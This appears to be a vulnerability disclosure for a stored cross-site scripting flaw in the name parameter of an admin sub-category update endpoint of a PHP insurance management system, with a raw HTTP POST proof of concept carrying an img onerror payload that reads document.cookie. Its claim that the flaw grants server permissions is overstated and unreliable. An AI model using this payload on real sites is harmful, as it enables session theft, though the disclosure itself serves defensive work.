## Affected version: 
Insurance Management System - 1.0

## Vendor:
https://www.sourcecodester.com/users/munyweki

## Software:
https://www.sourcecodester.com/php/16995/insurance-management-system-php-mysql.html

## Vulnerability File:
/e-insurance/Script/admin/core/update_sub_category

## Description:
There is a stored XSS vulnerability in the name parameter of the added ticket class in the insurance management system. An attacker can use this vulnerability to gain server permissions.

Status: CRITICAL

POC
```
POST /e-insurance/Script/admin/core/update_sub_category HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 94
Origin: http://localhost
Connection: close
Referer: http://localhost/e-insurance/Script/admin/?page=sub-categories
Cookie: PHPSESSID=cims89c5nt143re39d3ce6cdvd; __insuarance__logged=1; __insuarance__key=SK9MGL4R5CQPM34FZSH3
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

category=7&name=%3Cimg+Src%3D1+Onerror%3Dalert%28document.cookie%29%3E&status=1&id=13&submit=1
```

Get user cookie


<img width="1520" alt="image" src="https://github.com/user-attachments/assets/d2a3cd4c-b6d4-4f52-afa5-4d3c76ddf8fd">

<img width="1589" alt="image" src="https://github.com/user-attachments/assets/8d54a3f5-856e-4ce3-afa5-d30bd13cce50">







 
